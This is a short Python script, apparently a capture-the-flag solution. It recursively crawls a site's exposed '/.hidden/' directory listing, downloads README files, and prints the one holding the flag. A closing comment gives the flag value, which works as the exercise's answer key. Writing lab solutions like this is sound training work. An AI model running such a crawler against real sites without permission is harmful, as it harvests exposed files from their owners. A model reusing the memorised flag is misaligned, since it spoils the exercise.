import requests                                         # get the page
from bs4 import BeautifulSoup                           # parse html
import urllib.request as urllib2                        # download file (README)

URL = input("Website URL: ")
URL += "/.hidden/"                   			# url to start crawler from

def print_readme(url):                                  # recursive function to check all link in .hidden and find all README
    page = requests.get(url)                            # get the html page
    soup = BeautifulSoup(page.content, "html.parser")   # parse html with beautifulSoup

    for link in soup.find_all('a'):                     # when I analyse the hmtl code, I can see all the important information for me is in the <a> tag so I create a list with all these tag
        if (link.get('href') == "README"):              # if i found the README
            filedata = urllib2.urlopen(url + "README")  # download the README
            data = filedata.read().decode("utf-8")      # decode bytes to string
            if "flag" in data:                          # check if the flag is in there
                print(data)                             # print flag
                exit()
        elif (link.get('href') != "../"):               # if I found an url and not the readme
            print_readme(url + link.get('href'))        # recall actual function

print_readme(URL)                                       # main function

#output : Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466 
